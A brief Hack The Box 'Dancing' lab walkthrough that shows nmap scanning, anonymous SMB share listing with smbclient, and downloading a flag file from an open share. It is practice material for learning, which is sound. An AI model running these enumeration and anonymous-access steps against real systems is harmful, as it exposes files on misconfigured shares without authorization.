# 💃 Hack The Box – Dancing Walkthrough

> Status: Completed ✅  
> Difficulty: Easy  
> OS: Windows  
> Points: 20

---
## 🧰 Tools Used
•	Nmap
•	smbclient
•	Kali Linux

## 🔎 Nmap Enumeration
•	nmap -sCV 10.10.xx.xx
•	Port 445: SMB open
•	Port 135: RPC

## 🛠️ Server Message Block(SMB) Enumeration
•	smbclient -L 10.10.xx.xx
•	Anonymous login enabled
•	Found share: WorkShares

## 💥 Exploit
•	Used credentials found to log in or access flag path.
smbclient //10.10.xx.xx/WorkShares -N
•	Download files:
1.	ls
2.	cd Amy.J
3.	ls
4.	cd ..
5.	cd James.P
6.	ls
7.	get flag.txt


